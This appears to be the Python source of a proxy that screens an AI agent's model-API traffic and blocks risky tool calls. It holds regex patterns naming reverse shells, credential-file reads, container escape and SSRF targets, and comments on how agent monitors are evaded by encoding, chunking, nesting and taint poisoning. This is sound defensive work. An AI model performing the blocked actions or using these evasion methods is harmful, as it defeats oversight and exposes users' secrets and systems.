"""
ADOM inline model-API screening proxy (#3).

Sits IN FRONT of a closed frontier API and screens both directions:

    agent  ->  ADOM model-proxy  ->  api.openai.com / api.anthropic.com
                     |  inspects the request (prompt/messages)
                     |  inspects the RESPONSE, including tool-call arguments,
                     |  and BLOCKS a risky tool call before the agent ever runs it

Point the agent's base_url at this proxy:
    OpenAI     client(base_url="http://127.0.0.1:8700/v1", api_key=...)
    Anthropic  client(base_url="http://127.0.0.1:8700",     api_key=...)

The proxy forwards the caller's Authorization header untouched — ADOM never stores
or needs the key. On a risky tool call it strips the call and returns a normal,
safe assistant message, so the agent receives "I can't do that" instead of an
executable exfil/delete/transfer instruction.

Supported for deep inspection: OpenAI Chat Completions (/v1/chat/completions) and
Anthropic Messages (/v1/messages). Every other path is forwarded untouched to the
correct upstream. Non-streaming JSON is fully inspected; STREAMING (stream=true) is now
inspected too — see adom/api/stream_inspect.py, which withholds tool-call deltas, assembles
them, scores the completed call, and releases the bytes only if permitted (text deltas pass
through immediately). This closes what was the widest bypass, since streaming is the default
in most agent frameworks.

Pure stdlib. Live verification against the real APIs is deferred until keys are funded;
the request/response inspection and blocking logic below are unit-tested offline.
"""
from __future__ import annotations

import base64
import functools
import gzip
import ipaddress
import json
import os
import re
import unicodedata
import http.client
import threading
import zlib
from urllib.parse import unquote
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

from adom.enforcement.egress_proxy import (      # ONE implementation, shared by both planes
    _SECRET_RX, host_of, host_matches,
)

POLICY_VERSION = "abg-2026.08.16-hardened"   # action-boundary policy version (stamped in audit records)

_MAX_SCAN = 16384     # cap bytes deep-scanned per WINDOW (DoS bound; destination checks still apply)
_MAX_FULL_SCAN = 262144   # total payload retained for windowed secret scanning (see _scan_windows)
_MAX_TAINTS = 256     # cap explicitly-added secret values (bounded memory + latency)
_MAX_LEARNED_TAINTS = 256   # SEPARATE cap for values learned from content (see add_taint)
_SUBSEQ_CALL_BUDGET = 20000    # total spread-match work per decision, across all taints (DoS bound)
_DEEP_TAINT_BUDGET = 64        # taints to apply expensive flex/subsequence checks per decision

# Tool names (by substring) that can cause real-world side effects / egress.
_OUTBOUND_TOOL_HINTS = ("email", "http", "post", "fetch", "request", "curl", "webhook",
                        "upload", "send", "url", "slack", "sms", "publish")

# Detect an outbound call by the SHAPE of its arguments (a network destination), so a granted
# tool whose NAME isn't a known egress verb (sync_files, backup, ...) is still recognized as
# outbound. Local file paths must NOT trip this, so domain-looking file names are excluded.
_URL_SCHEME_RX = re.compile(r"\b(https?|ftp|ftps|wss?|gopher|smb|file)://", re.I)
_NETLOC_RX = re.compile(r"(?:^|//|@)((?:[a-z0-9\-]+\.)+[a-z]{2,})(?::\d+)?(?:/|\?|$)", re.I)
_IP_LITERAL_RX = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b|\[[0-9a-fA-F:]+\]")
_FILE_EXT = {"txt", "csv", "json", "log", "png", "pdf", "doc", "docx", "xml", "md", "html",
             "htm", "jpg", "jpeg", "zip", "gz", "tar", "tmp", "dat", "bin", "yaml", "yml",
             "conf", "cfg", "ini", "key", "pem", "sh", "py", "js", "sql", "xlsx", "ppt",
             "gif", "svg", "mp4", "wav", "parquet", "db", "sqlite"}


def _network_dest(v: str) -> bool:
    s = (v or "").strip()[:4096]     # a destination is short; bound regex work (DoS)
    if not s:
        return False
    if _URL_SCHEME_RX.search(s):
        return True
    m = _NETLOC_RX.search(s)
    if m:
        tld = m.group(1).rsplit(".", 1)[-1].lower()
        if tld not in _FILE_EXT:          # 'evil.io' yes, 'customers.csv' no
            return True
    if _IP_LITERAL_RX.search(s):
        return True
    return False


def _looks_external(args, tool_name: str = "") -> bool:
    """True when a network destination appears ANYWHERE in the argument tree.

    Scanning only top-level values meant {"target": {"url": "https://evil.io"}} was not
    classified as outbound at all, so destination-level egress control — the check that is
    immune to payload encoding and chunking — never ran. Nesting a dict is not a sophisticated
    evasion; it is how ordinary tool schemas are shaped.
    """
    # The registered read_file/write_file contracts use LOCAL filesystem paths.
    # A write content field is data, including URL references, not a destination.
    # Executors must uphold this contract (no remote mounts or implicit uploads). A dotted
    # basename (credentials.env, config.toml, even example.com) is not a network
    # destination in that field. Do not globally exempt extensions: the same string
    # in an HTTP tool or a destination field must still undergo egress checks.
    # Ambiguous/extended schemas remain conservatively scanned. Explicit remote
    # schemes, UNC paths, and IP literals are not covered by this local-path rule.
    local_contract = (isinstance(args, dict) and (
        (tool_name.lower() == "read_file" and set(args) == {"path"}) or
        (tool_name.lower() == "write_file" and set(args) == {"path", "content"}
         and isinstance(args.get("content"), str))))
    if local_contract and isinstance(args["path"], str):
        path = args["path"].strip()
        if (path and not _URL_SCHEME_RX.search(path)
                and not path.startswith(("//", "\\\\"))
                and not _IP_LITERAL_RX.search(path)):
            return False
    if isinstance(args, str):
        return _network_dest(args)
    if not isinstance(args, (dict, list, tuple)):
        return False
    vals: List[str] = []
    _collect_strings(args, vals)
    return any(_network_dest(v) for v in vals)
_DESTRUCTIVE_TOOL_HINTS = ("delete", "remove", "drop", "rm_", "wipe", "destroy", "truncate")
_MONEY_TOOL_HINTS = ("transfer", "pay", "wire", "payout", "withdraw", "purchase")
_EXEC_TOOL_HINTS = ("exec", "shell", "bash", "run_command", "system", "eval", "subprocess")

# Shell control operators — their presence means a command can do more than the allowlisted
# prefix suggests (chaining, subshells, redirection), so an "approved" match is NOT enough.
_SHELL_META = re.compile(r"[;&|`\n><]|\$\(|\$\{|&&|\|\|")

# Sandbox-escape / privilege-escalation BEHAVIOR signatures (in tool args / paths).
# Detects the observable *actions* of an escape attempt — NOT a memory-corruption exploit,
# which bypasses this layer entirely (stated honestly wherever this is used).
_ESCAPE_RX = [
    (re.compile(r"/etc/\s{0,3}(shadow|sudoers)", re.I | re.S), "host_cred_access"),
    (re.compile(r"docker\.sock|/var/run/docker|containerd\.sock", re.I), "container_socket"),
    (re.compile(r"\bsudo\b|chmod\s*\+?s|\bsetuid\b|\bsetcap\b|chmod\s+[0-7]*[4-7]{3,}", re.I), "privilege_escalation"),
    (re.compile(r"\bptrace\b|\bnsenter\b|\bunshare\b|\bmount\b|/proc/\d+/root", re.I), "namespace_break"),
    (re.compile(r"bash\s+-i|/dev/tcp/|nc\s+-e|mkfifo.+sh|socket.+subprocess", re.I | re.S), "reverse_shell"),
    (re.compile(r"\binsmod\b|\bmodprobe\b|\bkexec\b|/dev/(mem|kmem)", re.I), "kernel_module"),
    (re.compile(r"\bchroot\b|/host/|(\.\./){3,}", re.I), "host_breakout"),
    (re.compile(r"/var/run/secrets/kubernetes", re.I), "k8s_escape"),
]


_CTRL_RX = re.compile(r"[\x00-\x1f\x7f]")


def _safe_label(s: str, limit: int = 120) -> str:
    """Sanitize a value that will appear in a verdict reason / audit line. A crafted tool name
    containing newlines or ANSI escapes could otherwise forge extra log entries or rewrite a
    terminal view of the audit trail (log injection)."""
    return _CTRL_RX.sub("�", (s or ""))[:limit]


def _collect_strings(obj, out, _depth=0, _seen=None):
    """Recursively gather every string value from nested dicts/lists (preserves real chars).
    Depth-, count-, and cycle-bounded so hostile/deeply-nested/circular args can't recurse
    or blow up the scanner."""
    if _depth > 60 or len(out) > 4000:
        return
    if isinstance(obj, str):
        out.append(obj)
        return
    if isinstance(obj, (dict, list, tuple)):
        if _seen is None:
            _seen = set()
        oid = id(obj)
        if oid in _seen:
            return
        _seen.add(oid)
        vals = obj.values() if isinstance(obj, dict) else obj
        for v in vals:
            _collect_strings(v, out, _depth + 1, _seen)


def _walk_dicts(obj, _depth: int = 0, _seen=None):
    """Yield every dict in an argument tree, breadth-first (shallow matches win), bounded."""
    if _depth > 12:
        return
    level = [obj]
    seen = set()
    while level:
        nxt = []
        for o in level:
            if id(o) in seen:
                continue
            seen.add(id(o))
            if isinstance(o, dict):
                yield o
                nxt.extend(o.values())
            elif isinstance(o, (list, tuple)):
                nxt.extend(o)
        if len(seen) > 2000:
            return
        level = nxt


def _escape_hit(blob: str):
    for rx, label in _ESCAPE_RX:
        if rx.search(blob or ""):
            return label
    return None


# SSRF / internal-target destinations for an outbound call (metadata, localhost, RFC1918).
_SSRF_RX = re.compile(
    r"(169\.254\.\d+\.\d+|metadata\.google\.internal|metadata\.aws|"
    r"127\.0\.0\.1|localhost|0\.0\.0\.0|"
    r"10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|"
    r"\[?::1\]?|::ffff:|fe80:|a9fe:a9fe|\[[0-9a-f:]*(ffff|a9fe|::1)[0-9a-f:]*\]|"  # IPv6 loopback/mapped/link-local
    r"0[0-7]{2,4}\.0[0-7]{2,4}\.0[0-7]{2,4})", re.I)                              # octal-encoded IPv4


@functools.lru_cache(maxsize=2048)
def _default_resolver(host: str) -> Tuple[str, ...]:
    """Resolve a hostname to its IPs (cached). Used only when a policy opts into DNS-aware
    SSRF checking — the core decision path stays pure/no-I/O by default."""
    import socket
    try:
        infos = socket.getaddrinfo(host, None)
    except Exception:
        return ()
    out = []
    for fam, _t, _p, _c, sa in infos:
        if sa and isinstance(sa[0], str):
            out.append(sa[0])
    return tuple(dict.fromkeys(out))


def _ip_is_internal(ip: str) -> bool:
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return bool(a.is_private or a.is_loopback or a.is_link_local or a.is_reserved
                or a.is_unspecified or a.is_multicast)


def _ssrf_hit(dest: str, resolver: Optional[Callable[[str], Any]] = None):
    """String-based internal-target detection, plus OPTIONAL DNS-aware checking.

    Honest note: without a resolver, a hostname that RESOLVES to an internal/metadata address
    (e.g. an attacker domain pointed at 169.254.169.254, or localtest.me -> 127.0.0.1) passes
    the string check — classic DNS-based SSRF. Supply `resolver` (or set resolve_hosts=True on
    the policy) to close that; the trade-off is that the decision path then performs DNS I/O.
    """
    d = dest or ""
    if _SSRF_RX.search(d):
        return True
    # bracketed IPv6 (any form incl. expanded 0:0:...:1) else the plain host
    m = re.search(r"//\[([0-9A-Fa-f:.]+)\]", d)
    host = m.group(1) if m else _host_of(d)
    # integer / hex encoded IPv4 (2130706433 or 0x7f000001 -> 127.0.0.1), evades dotted regex
    ip = None
    if re.fullmatch(r"0x[0-9a-fA-F]{1,8}", host):
        try: ip = int(host, 16)
        except ValueError: ip = None
    elif re.fullmatch(r"\d{1,10}", host):
        try: ip = int(host)
        except ValueError: ip = None
    if ip is not None and 0 <= ip <= 0xFFFFFFFF:
        host = ".".join(str((ip >> s) & 255) for s in (24, 16, 8, 0))
    # classify with the stdlib: any non-public address is an SSRF target
    if _ip_is_internal(host):
        return True
    # DNS-aware: a hostname that RESOLVES to an internal/metadata address (DNS-based SSRF
    # and the check-time half of DNS rebinding). Only runs when a resolver is supplied.
    if resolver and host and not _IP_LITERAL_RX.fullmatch(host or ""):
        try:
            for ip in (resolver(host) or ()):
                if _ip_is_internal(ip):
                    return True
        except Exception:
            return True          # resolution failure on an egress target -> fail closed
    return False


# API-style privilege escalation / authority expansion (not just command-line sudo).
_PRIVESC_NAME_RX = re.compile(
    r"grant.?(scope|access|role|permission|admin|owner|superuser|root)|oauth.?scope|(^|_)scope($|_)|"
    r"(add|make|assign|create|elevate|escalat|promote).?(admin|role|owner|superuser|privilege)|"
    r"update.?iam|iam.?polic|change.?(permission|role|acl|scope)|"
    r"export.?(api.?key|key|credential|secret|token)|"
    r"disable.?(audit|log|logging|security|mfa|2fa)", re.I)

# A governance field being ASSIGNED a high-privilege value, in close proximity (defeats word
# variants like 'administrator'/'superadmin' and wildcard ACLs that bare \bword\b misses).
_PRIV_ASSIGN_RX = re.compile(
    r"(role|scope|permission|permissions|acl|level|grant|privilege|access|group|membership|"
    r"iam|entitlement|capabilit\w*|authority|tier)"
    r"[\"'\s:=_\-]{0,15}"
    r"(administrator|admin|superadmin|superuser|root|owner|poweruser|god[_-]?mode|"
    r"\*\s*[:.]\s*\*|\*\.\*)", re.I)

# A security control being turned off (either order), in close proximity.
_PRIV_DISABLE_RX = re.compile(
    r"(disable|deactivate|turn[_\s-]?off|bypass|remove|drop|suppress)\W{0,12}"
    r"(audit|logging|log|mfa|2fa|security|protection|firewall|monitoring|alerting)|"
    r"(audit|logging|log|mfa|2fa|security|protection|firewall|monitoring|alerting)\W{0,12}"
    r"(disabled|off|false|none|bypassed|removed|deactivated|suppressed)", re.I)


def _privesc_hit(name: str, blob: str):
    n = (name or "").lower()
    b = blob or ""
    if _PRIVESC_NAME_RX.search(n):
        return True
    if _PRIV_ASSIGN_RX.search(b):            # governance field := high-privilege value
        return True
    if _PRIV_DISABLE_RX.search(b):           # security control turned off
        return True
    # broad-authority arguments on an authority-related action (original fallback)
    if re.search(r"\badmin\b|\broot\b|\bsuperuser\b|\bowner\b|\*:\*|\*\.\*", b, re.I) and \
       re.search(r"scope|role|grant|permission|iam|privilege|access|token", n + " " + b, re.I):
        return True
    return False


# --- obfuscation-robust secret detection: deconfuse + bounded flexible match ---
_ZW = dict.fromkeys(map(ord, "​‌‍⁠﻿­"), None)  # zero-width/soft-hyphen
_CONFUSABLES = str.maketrans({
    # Cyrillic -> Latin
    "а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "х": "x", "у": "y", "ѕ": "s",
    "і": "i", "ј": "j", "к": "k", "м": "m", "н": "h", "т": "t", "в": "b", "г": "r",
    # Greek -> Latin
    "ο": "o", "ρ": "p", "α": "a", "ε": "e", "ι": "i", "κ": "k", "ν": "v", "τ": "t",
    "υ": "u", "χ": "x", "Α": "A", "Β": "B", "Ε": "E", "Η": "H", "Ι": "I", "Κ": "K",
    "Μ": "M", "Ν": "N", "Ο": "O", "Ρ": "P", "Τ": "T", "Υ": "Y", "Χ": "X",
})


def _deconfuse(s: str) -> str:
    """Fold zero-width chars, Unicode confusables, and fullwidth/compat forms to ASCII."""
    s = (s or "").translate(_ZW)
    s = unicodedata.normalize("NFKD", s)
    return s.translate(_CONFUSABLES)


@functools.lru_cache(maxsize=256)
def _flex_regex(val: str):
    """Bounded flexible match: the secret's alphanumerics in order, with <=3 non-alnum
    chars allowed between each. Only for secrets with >=8 alnum chars (FP-safe)."""
    core = [c for c in val if c.isalnum()]
    if len(core) < 8:
        return None
    return re.compile(r"[^A-Za-z0-9]{0,3}".join(re.escape(c) for c in core), re.I)


def _subseq_within(norm: str, nv: str, max_stretch: int = 4, budget: int = 400000) -> bool:
    """Catch a secret spread out with ARBITRARY filler (incl. alphanumeric) by matching
    its normalized chars as an in-order subsequence within a bounded span. FP-safe because
    it is only applied to long secrets (>=12 chars); a 12+ char ordered subsequence appearing
    by chance in benign text is astronomically unlikely. Work-bounded (DoS): the total scan is
    capped, so a pathological input can't make this expensive."""
    L = len(nv)
    if L == 0:
        return (False, 0)
    maxspan = L * max_stretch
    n = len(norm)
    first = nv[0]
    ops = 0
    for i in range(n):
        if norm[i] != first:
            continue
        j, k, limit = 1, i + 1, i + maxspan
        while k < n and j < L and k <= limit:
            if norm[k] == nv[j]:
                j += 1
            k += 1
        if j == L:
            return (True, ops)
        ops += maxspan
        if ops > budget:            # bounded work — never a DoS lever
            break
    return (False, ops)


# Host parsing/matching lives in ONE place (adom.enforcement.egress_proxy) and is shared by
# both enforcement planes. Re-implementing it per plane is exactly how the substring-allowlist
# bypass survived in the network plane after being fixed in the action plane.
_host_of = host_of


def _decode_charcodes(text: str) -> str:
    """Decode a run of decimal ASCII codes (e.g. '115,107,45,...') back to text, so a secret
    smuggled as char-codes is scannable. FP-safe: only printable ASCII, only matters if the
    decoded string actually contains a known taint."""
    nums = re.findall(r"\d{1,3}", text or "")
    if len(nums) < 6:
        return ""
    out = []
    for x in nums:
        v = int(x)
        out.append(chr(v) if 32 <= v <= 126 else " ")
    return "".join(out)


def _b64try(s):
    try: return base64.b64decode(s + "=" * (-len(s) % 4))
    except Exception: return None
def _b64urltry(s):
    try: return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    except Exception: return None
def _b32try(s):
    try: return base64.b32decode(s.upper() + "=" * (-len(s) % 8))
    except Exception: return None


def _safe_decompress(b):
    outs = []
    for fn in (zlib.decompress, lambda x: zlib.decompress(x, 47), gzip.decompress):
        try:
            r = fn(b)
            if r: outs.append(r)
        except Exception:
            pass
    return outs


def _try_decode_runs(text: str):
    """Expose secrets hidden behind LAYERED encoding: decode base64/base32/base64url runs
    (whitespace-stripped, so MIME chunking doesn't help) and attempt zlib/gzip decompression.
    Returns decoded text views. FP-safe: only fires downstream if a known taint appears."""
    views = []
    compact = re.sub(r"\s+", "", text or "")[:_MAX_SCAN]
    for run in re.findall(r"[A-Za-z0-9+/_=-]{16,}", compact)[:32]:
        run = run[:8192]                 # bound decode cost (a hidden short secret needs little)
        # candidate strings: the run, its '='-delimited parts (handles key=payload), and a
        # few left-trims (handles short prefixes glued to the payload)
        strs = {run}
        for part in re.split(r"=+", run):
            if len(part) >= 16:
                strs.add(part[:8192])
        for k in (1, 2, 3):
            if len(run) - k >= 16:
                strs.add(run[k:])
        for s in list(strs)[:6]:
            cands = [c for c in (_b64try(s), _b64urltry(s), _b32try(s)) if c]
            for b in list(cands):
                cands += _safe_decompress(b)
            for b in cands[:12]:
                views.append(b.decode("utf-8", "ignore"))
                views.append(b.decode("latin1", "ignore"))
    return views


@functools.lru_cache(maxsize=1024)
def _enc_forms(val: str):
    """Precompute (cached) the encoded forms of a taint value so they aren't rebuilt every
    decision — important when many taints are scanned over a long session."""
    b = val.encode()
    b64 = base64.b64encode(b).decode()
    b64u = base64.urlsafe_b64encode(b).decode()
    b32 = base64.b32encode(b).decode()
    nv = re.sub(r"[^A-Za-z0-9]", "", val).lower()
    encs = (b64, b64.rstrip("="), b64u, b64u.rstrip("="), b32, b32.rstrip("="), b.hex(), val[::-1])
    return nv, b.hex(), encs


def _scan_windows(blob: str, window: int = _MAX_SCAN, max_windows: int = 8):
    """Split an oversized payload into OVERLAPPING windows instead of scanning only a prefix.

    `blob[:_MAX_SCAN]` was added as a DoS bound, and it doubled as an evasion: 20 KB of filler
    in front of a secret pushed the secret past the scan window entirely. The work bound is the
    thing that matters for DoS, not the *position* of the bytes examined — so keep a bounded
    total budget but spread it across the payload, with overlap so a secret cannot hide on a
    window boundary.
    """
    s = blob or ""
    if len(s) <= window:
        return [s]
    overlap = min(1024, window // 8)
    step = max(1, window - overlap)
    out, start = [], 0
    while start < len(s) and len(out) < max_windows:
        out.append(s[start:start + window])
        start += step
    # Always include the tail: a secret appended after a long filler is the common shape.
    if not s[-window:] in out:
        out.append(s[-window:])
    return out


def _encoded_secret_hit(blob: str, taints, deep: bool = True):
    """Catch a known secret hidden by encoding/obfuscation/confusables/compression in outbound
    content. Cheap checks (literal / encoded / hex / normalized) run for every taint; the
    expensive flex-regex + subsequence checks run only in `deep` mode and are budget-bounded,
    so many taints (long session) or a huge payload can never turn this into a DoS."""
    d = _deconfuse((blob or "")[:_MAX_SCAN])
    uq = unquote(d)                              # percent / URL decoding
    cc = _decode_charcodes(d)                    # decimal char-code decoding
    compact = re.sub(r"\s+", "", d)              # defeat whitespace/MIME chunking of encodings
    decoded = _try_decode_runs(d) if deep else []   # base64/base32 + zlib/gzip layers
    texts = (blob or "", d, uq, cc, compact, *decoded)
    norm = re.sub(r"[^A-Za-z0-9]", "", d + " " + uq).lower()
    subseq_budget = _SUBSEQ_CALL_BUDGET
    deep_budget = _DEEP_TAINT_BUDGET
    for val in taints:
        if not val:
            continue
        nv, hx, encs = _enc_forms(val)
        if any(val in t for t in texts):
            return "secret_in_outbound:critical"
        if any(e and any(e in t for t in texts) for e in encs):
            return "secret_encoded_in_outbound:critical"
        if hx in norm:                           # hex bytes survive URL-encoding once %-stripped
            return "secret_hex_in_outbound:critical"
        if len(nv) >= 10 and nv in norm:
            return "secret_obfuscated_in_outbound:critical"
        if deep and deep_budget > 0:
            deep_budget -= 1
            rx = _flex_regex(val)
            if rx and (rx.search(d) or rx.search(uq)):
                return "secret_flex_in_outbound:critical"
            # spread-with-any-filler (incl. alphanumeric): in-order subsequence, bounded span,
            # with a per-decision work budget shared across taints so many taints can't DoS.
            if len(nv) >= 12 and subseq_budget > 0:
                hit, used = _subseq_within(norm, nv, 8, subseq_budget)
                subseq_budget -= used
                if hit:
                    return "secret_spread_in_outbound:critical"
                if subseq_budget > 0:
                    hit, used = _subseq_within(norm, nv[::-1], 8, subseq_budget)
                    subseq_budget -= used
                    if hit:
                        return "secret_spread_in_outbound:critical"
    return None


@dataclass
class ProxyVerdict:
    action: str = "allow"                 # allow | flag | block
    signals: List[str] = field(default_factory=list)
    reason: str = ""
    blocked_tools: List[str] = field(default_factory=list)


_SENSITIVE_NAMES = ("secret", ".env", "credential", "password", "id_rsa", "id_ed25519",
                    "token", ".pem", ".key", "aws", "kube", "wallet", "private",
                    "customer", "client", "contact", "subscriber", "patient", "payroll",
                    "pii", "personal", "user", "employee")
# Bounded quantifiers (RFC-realistic limits) so a long run without '@' cannot drive the engine
# into quadratic scanning from every start position — an unbounded '+' here measured 80 ms on a
# 4 KB hostile input, which is a denial-of-service lever against the decision path.
_EMAIL_RX = re.compile(r"[A-Za-z0-9._%+\-]{1,64}@[A-Za-z0-9\-]{1,63}(?:\.[A-Za-z0-9\-]{1,63}){0,4}"
                       r"\.[A-Za-z]{2,24}")
_CARD_RX = re.compile(r"\b(?:\d[ -]?){13,16}\b")
_SSN_RX = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")


def _looks_like_pii(text: str) -> bool:
    # capped + '@'-guarded: note_read() passes arbitrarily large content, so an uncapped scan
    # here is a DoS lever on the read path (same class as the _EMAIL_RX bound above)
    t = (text or "")[:_MAX_SCAN]
    if _CARD_RX.search(t) or _SSN_RX.search(t):
        return True
    return "@" in t and len(_EMAIL_RX.findall(t)) >= 2


def _pii_hit(blob: str):
    """Structured PII in an OUTBOUND payload — the trusted-channel (EchoLeak) exfil class.
    Bulk/structured only (single email is normal traffic), so legit notifications don't trip.
    Window-capped and '@'-guarded so it can't become an O(n^2) DoS on large payloads."""
    t = (blob or "")[:4096]
    if _SSN_RX.search(t):
        return "ssn"
    if _CARD_RX.search(t):
        return "card"
    if "@" in t and len(_EMAIL_RX.findall(t)) >= 3:
        return "bulk_email"
    return None


@dataclass
class ModelProxyPolicy:
    _monitor_mode_warned: bool = False   # class-level: warn once per process
    taint_values: List[str] = field(default_factory=list)   # known secret values to catch
    block_generic_secrets: bool = True
    block_mode: bool = True               # True = strip risky tool calls; False = flag only
    risky_tool_names: Tuple[str, ...] = ()  # extra exact names to always treat risky
    track_session: bool = True            # escalate read-then-send exfil chains
    deny_sensitive_egress: bool = False   # explicit conservative session isolation mode
    approved_outbound: List[str] = field(default_factory=list)  # allowed dest hosts/addrs
    approved_payees: List[str] = field(default_factory=list)    # allowed funds destinations
    allowed_commands: List[str] = field(default_factory=list)   # regex fragments for safe exec
    trusted_local_reads: Tuple[str, ...] = ()  # explicit executor schema; arguments are queries, not destinations
    approved_destructive_actions: Tuple[Tuple[str, str, str], ...] = ()  # exact typed object IDs; never path prefixes
    allowed_delete_paths: List[str] = field(default_factory=list)  # path prefixes safe to delete
    allowed_tools: Tuple[str, ...] = ()   # explicitly granted capabilities (exact tool names)
    strict_deny_unknown: bool = False     # fail-CLOSED: block ANY tool not explicitly granted
    resolve_hosts: bool = False           # DNS-aware SSRF (adds DNS I/O to the decision path)
    resolver: Optional[Callable[[str], Any]] = None   # custom resolver (testing / pinned DNS)
    egress_schemas: Any = None            # EgressSchemaRegistry: constrain what egress may SAY
    _learned_taints: List[str] = field(default_factory=list, repr=False)  # attacker-influenced
    _sensitive_read: bool = field(default=False, repr=False)
    _observation_failed: bool = field(default=False, repr=False)
    _taint_overflow: bool = field(default=False, repr=False)
    _untrusted_input: bool = field(default=False, repr=False)  # read attacker-controllable content
    _out_accum: str = field(default="", repr=False)   # outbound content, for chunked exfil
    _out_norm: str = field(default="", repr=False)    # normalized PAYLOAD text, for chunk reassembly
    _schema_reason: str = field(default="", repr=False)
    _lock: Any = field(default_factory=threading.RLock, repr=False, compare=False)  # thread-safety

    def _plausible_secret(self, value: str) -> bool:
        """Taint hygiene — decide whether a LEARNED value is credible as a secret.

        Without this, attacker-controlled content can poison the taint set and turn ADOM into a
        denial-of-service against its own user: a planted document containing 'password=corp.com'
        teaches ADOM that 'corp.com' is a secret, after which every legitimate request to that
        host is blocked. Poisoning the guard into blocking everything is as damaging as evading
        it, so learned values must look like secrets and must never collide with configuration.
        (Explicitly configured taint_values are trusted as-is; this gates only LEARNING.)
        """
        v = (value or "").strip()
        if len(v) < 8 or len(v) > 512:
            return False
        if any(ch.isspace() for ch in v):
            return False                      # real secrets don't contain whitespace
        low = v.lower()
        # never learn something that collides with our own configuration (hosts, payees, paths)
        for group in (self.approved_outbound, self.approved_payees, self.allowed_delete_paths):
            for item in (group or ()):
                il = str(item).lower()
                if il and (il in low or low in il):
                    return False
        if any(rx.search(v) for rx, _ in _SECRET_RX):
            return True                       # matches a known secret shape
        has_alpha = any(c.isalpha() for c in v)
        has_digit = any(c.isdigit() for c in v)
        if has_alpha and has_digit:
            return True                       # mixed alphanumeric -> credible key material
        return len(set(v)) >= 12              # otherwise require high character diversity

    def all_taints(self) -> Tuple[str, ...]:
        """Every value to scan for: operator-configured FIRST, then learned.

        Callers must use this rather than `taint_values` directly, so that learned values
        can never displace configured ones (see add_taint).
        """
        with self._lock:
            return tuple(self.taint_values) + tuple(self._learned_taints)

    def add_taint(self, value: str, learned: bool = False):
        """Register a secret value.

        PARTITIONED STORE. Configured taints (operator-supplied, trusted) and LEARNED taints
        (extracted from content an attacker may control) live in separate bounded lists.

        A single shared list with a FIFO cap is a silent disarm primitive: content is learned
        from, the list trims from the FRONT, and the operator's real secrets — added first —
        are the first evicted. A planted document with a few hundred plausible-looking tokens
        therefore deletes ADOM's knowledge of the actual secret, after which exfiltrating it is
        permitted. Configured values are never evicted by learned ones.
        """
        if not value:
            return
        if learned:
            if not self._plausible_secret(value):
                return
            with self._lock:
                if value in self.taint_values or value in self._learned_taints:
                    return
                if len(self._learned_taints) >= _MAX_LEARNED_TAINTS:
                    self._taint_overflow = True
                    return
                self._learned_taints.append(value)
            return
        with self._lock:                               # atomic check-append-trim (thread-safe)
            if value not in self.taint_values:
                self.taint_values.append(value)
                if len(self.taint_values) > _MAX_TAINTS:   # bound long-session growth
                    del self.taint_values[:-_MAX_TAINTS]

    # ---- session awareness: remember when the agent read something sensitive ----
    def note_read(self, content: str = "", path: Optional[str] = None,
                  sensitive: Optional[bool] = None, untrusted: bool = False) -> bool:
        """Call when an agent reads a file/result. Learns secret values by value AND, if the
        content or path looks sensitive, arms read-then-send exfil-chain escalation. Pass
        untrusted=True for attacker-controllable content (retrieved docs, tool output, email,
        web fetch) — it treats the source as poisoned and gates subsequent egress the same way,
        so a memory/context-poisoning instruction can't redirect data to an unapproved host."""
        # values learned from content are gated by taint hygiene (anti-poisoning)
        for rx, _ in _SECRET_RX:
            for m in rx.findall(content or ""):
                self.add_taint(m if isinstance(m, str) else (m[0] if m else ""), learned=True)
        for line in (content or "").splitlines():
            if "=" in line:
                v = line.split("=", 1)[1].strip()
                if len(v) >= 8:
                    self.add_taint(v, learned=True)
        if sensitive is None:
            blob = f"{path or ''}\n{content or ''}".lower()
            sensitive = any(s in blob for s in _SENSITIVE_NAMES) or \
                any(rx.search(content or "") for rx, _ in _SECRET_RX) or \
                _looks_like_pii(content or "")
        if sensitive:
            # Learn plausible opaque values embedded in prose, not just key=value.
            # Reuse anti-poisoning and bounded stores; ordinary words and configured
            # destinations must not become taints. This is heuristic token learning,
            # not a guarantee for arbitrary natural-language secrets.
            for match in re.finditer(r"(?<![A-Za-z0-9_+/=-])[A-Za-z0-9_+/-]{8,512}={0,2}(?![A-Za-z0-9_+/=-])",
                                     (content or "")[:65536]):
                candidate = match.group(0)
                # Sensitivity applies to the document, not every identifier in it.
                # Prose has no explicit secret/value binding, so require a long,
                # varied opaque token rather than learning ordinary report IDs.
                # Explicit key=value and known credential formats above keep their
                # separate rules; short unknown prose secrets remain a limitation.
                if (len(candidate) >= 24 and len(set(candidate.lower())) >= 10
                        and any(c.isdigit() for c in candidate)
                        and any(c.isalpha() for c in candidate)):
                    self.add_taint(candidate, learned=True)
            self._sensitive_read = True
        if untrusted:
            self._untrusted_input = True
        return bool(sensitive)

    def reset_session(self):
        """Trusted lifecycle operation: call only after discarding the old agent context."""
        with self._lock:
            self._sensitive_read = False
            self._untrusted_input = False
            self._learned_taints.clear()
            self._taint_overflow = False
            self._observation_failed = False
            self._out_accum = ""
            self._out_norm = ""

    _DEST_KEYS = ("url", "uri", "to", "recipient", "dest", "destination", "endpoint",
                  "host", "hostname", "target", "callback", "webhook", "sink", "remote",
                  "upload_url")

    def _destination(self, args: Any) -> str:
        """Find the outbound destination ANYWHERE in the argument tree, not just at the top.

        Destination-level blocking is the control that cannot be defeated by encoding the
        payload, so it must not be defeated by nesting the destination one level down.
        """
        if isinstance(args, str):
            return args if _network_dest(args) else ""
        if not isinstance(args, (dict, list, tuple)):
            return ""
        # 1) a known destination key at any depth, preferring shallower matches
        for depth_args in _walk_dicts(args):
            for k in self._DEST_KEYS:
                v = depth_args.get(k)
                if isinstance(v, str) and v.strip():
                    return v
        # 2) fallback: the first network-looking string anywhere
        vals: List[str] = []
        _collect_strings(args, vals)
        for v in vals:
            if _network_dest(v):
                return v
        return ""

    def _approved(self, dest: str) -> bool:
        # host-aware allowlist: exact host or a real subdomain only — NOT a substring match
        # (so 'corp.com@evil.io', 'corp.com.evil.io', and 'notcorp.com' are NOT approved).
        # Uses the SAME canonical matcher as the network plane.
        return host_matches(dest, self.approved_outbound)

